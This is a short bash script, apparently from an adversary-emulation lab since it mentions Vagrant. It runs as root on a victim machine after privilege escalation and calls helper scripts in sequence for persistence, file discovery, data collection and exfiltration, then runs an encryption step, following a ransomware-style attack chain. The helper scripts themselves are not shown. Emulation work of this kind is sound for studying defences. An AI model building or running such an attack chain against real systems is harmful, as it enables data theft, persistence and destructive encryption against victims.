#!/bin/bash

# ONLY EXECUTED AFTER GETTING PE, AS ROOT
echo "[+] Ensure we are at home folder of the victim where scripts were downloaded"
cd /home/resch/.scripts
echo "[+] Check dependencies for encryption"
# Install requirements after getting root
./check.sh
pip3 install -r ./requirements.txt
echo "[+] Starting persistence..."
# Start Persistence
./persistence1.sh
echo "[+] Persistence ended, do vagrant up --provision once everything is done..."
echo "[+] Starting file discovery..."
# Start File discovery
./file_and_dir_discovery.sh
echo "[+] File discovery ended..."
echo "[+] Starting collection..."
# Start Collection
./collectiontarget.sh
echo "[+] Collection ended..."
echo "[+] Starting exfiltration..."
# Start Exfiltration
./exfiltration_target.sh
echo "[+] Exfiltration ended..."
echo "[+] Starting encryption..."
# Start Encryption
python3 encrypt.py
echo "[+] Encryption ended..."
